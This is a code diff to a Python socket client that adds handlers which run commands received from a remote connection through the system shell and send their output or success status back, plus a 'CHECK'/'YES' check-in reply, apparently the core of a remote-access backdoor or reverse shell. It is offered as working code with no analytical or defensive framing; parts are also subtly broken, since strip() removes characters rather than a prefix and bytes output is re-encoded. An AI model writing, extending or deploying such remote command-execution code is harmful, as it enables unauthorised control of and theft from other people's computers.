@@ -2,6 +2,7 @@ import socket
 import os
 import subprocess
 from multiprocessing import Process,current_process
+from threading import Thread
 import struct
 import platform
 
@@ -24,8 +25,28 @@ def start_session(s):
             if "CHECK" in cmd:
                 s.send("YES".encode())
 
+            if "shell" in cmd:
+                cmd = cmd.strip("shell ")
+                try:
+                    pipe = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
+                    output = pipe.stdout.read()
+                    s.send("DONE".encode())
+                    s.send(output.encode())
+                except:
+                    s.send("FAILED".encode())
+                    pass
+
             if "execute" in cmd:
                 cmd = cmd.strip("execute ")
+                try:
+                    pipe = subprocess.call(cmd,shell=True)
+                    if(pipe == 0):
+                        s.send("SUCCESS".encode())
+                    else:
+                        s.send("FAILED".encode())
+                except:
+                    pass
+
                 #Pending...
 
         #    cmd_size = struct.unpack("<H",cmd[:2])
@@ -42,4 +63,5 @@ def main():
     conn_process.start()
 
 if __name__ == '__main__':
-    main()
+    main_thread = Thread(target=main,args=())
+    main_thread.start()
